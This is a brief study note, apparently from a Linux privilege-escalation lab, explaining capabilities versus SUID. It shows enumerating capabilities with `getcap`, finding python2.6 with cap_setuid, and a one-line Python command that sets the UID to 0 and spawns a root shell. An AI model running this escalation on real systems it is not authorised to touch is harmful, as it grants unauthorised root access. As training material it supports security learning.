
Unlike SUID which gives the user full privilege access, with capabilities we can give granular access to privilege tasks as needed. Read [Article 1](https://mn3m.info/posts/suid-vs-capabilities/) and [Article 2](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) for more details.

We can check for existing capabilities with the `getcap` command.

```bash
TCM@debian:~$ getcap -r / 2>/dev/null 
/usr/bin/python2.6 = cap_setuid+ep
```

We see that `/usr/bin/python2.6` has the capability to `setuid` and the `+ep` indicates it is also permitted all actions (effective permitted).

Since we can set the UID with python, we can do the following.

```bash
TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~# whoami
root
```

> [!tip] 
> Capabilities will not show up when the `find -perm -04000` command is run!

